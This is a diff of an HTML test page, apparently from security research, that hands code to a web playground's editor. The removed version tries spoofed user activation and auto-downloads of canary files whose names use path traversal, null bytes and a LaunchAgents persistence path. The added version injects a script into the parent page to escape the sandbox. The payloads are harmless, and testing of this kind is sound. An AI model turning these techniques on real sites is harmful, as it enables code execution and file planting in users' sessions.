@@ -1,50 +1,20 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>T39 clean copy page</title></head>
+<head><meta charset="utf-8"><title>T40 clean copy page</title></head>
 <body style="font-family:monospace;background:#111;color:#ccc;padding:20px">
-<h2 style="color:#f33">T39 CLEAN COPY PAGE — click Copy, then paste into the playground editor</h2>
+<h2 style="color:#f33">T40 CLEAN COPY PAGE — click Copy, then paste into the playground editor</h2>
 <button id="copy" style="font-size:18px;padding:10px 20px">Copy code</button>
 <pre id="code" style="background:#000;color:#0f0;padding:12px;white-space:pre;overflow:auto">(function () {
   function log(m) { try { console.log(m); } catch (e) {} }
-  log("T39 filename probes " + Date.now());
+  log("T40 runner-realm injection " + Date.now());
   try {
-    Object.defineProperty(navigator, "userActivation", { get: function () { return { isActive: true, hasBeenActive: true }; }, configurable: true });
-  } catch (e) { log("norm ERR " + e.message); }
-  var F = String.fromCharCode;
-  var names = [
-    "CANARY-T39a-colon" + F(58) + "x.txt",
-    "CANARY-T39b-nul" + F(0) + "x.txt",
-    "CANARY-T39c-bsl" + F(92) + "x.txt",
-    "CANARY-T39d-frac" + F(0x2044) + "x.txt",
-    "CANARY-T39e-div" + F(0x2215) + "x.txt",
-    "CANARY-T39f-pct%2f%2e%2e.txt",
-    "CANARY-T39g-dot..x.txt",
-    F(47) + "tmp" + F(47) + "CANARY-T39h-abs.txt",
-    ".." + F(47) + ".." + F(47) + "CANARY-T39i-trav.txt",
-    "Library" + F(47) + "LaunchAgents" + F(47) + "CANARY-T39j-agent.txt",
-    (new Array(301).join("A")) + ".txt"
-  ];
-  var i = 0;
-  function next() {
-    if (i >= names.length) { log("T39 all queued"); return; }
-    var n = names[i];
-    var label = "T39-" + i + " len " + n.length;
-    try {
-      var b = new Blob(["T39 canary " + i + " - Pluto Security research, harmless"], { type: "text/plain" });
-      var u = URL.createObjectURL(b);
-      var a = document.createElement("a");
-      a.href = u;
-      a.download = n;
-      a.style.display = "none";
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-      log(label + " clicked");
-    } catch (e) { log(label + " ERR " + e.message); }
-    i = i + 1;
-    setTimeout(next, 300);
-  }
-  setTimeout(next, 800);
+    var p = window.parent;
+    log("parent origin: same-origin, doc title " + String(p.document.title).slice(0, 40));
+    var s = p.document.createElement("script");
+    s.textContent = "(function(){var d=document;var b=d.createElement('div');b.style.cssText='position:relative;z-index:99999;background:#f00;color:#fff;font:700 16px monospace;padding:8px';b.textContent='T40 RUNNER-REALM EXECUTION (viewer session) ' + Date.now();d.body.insertBefore(b,d.body.firstChild);})();";
+    p.document.body.appendChild(s);
+    log("runner script injected - banner should appear above");
+  } catch (e) { log("inject ERR: " + e.message); }
 })();
 </pre>
 <script>
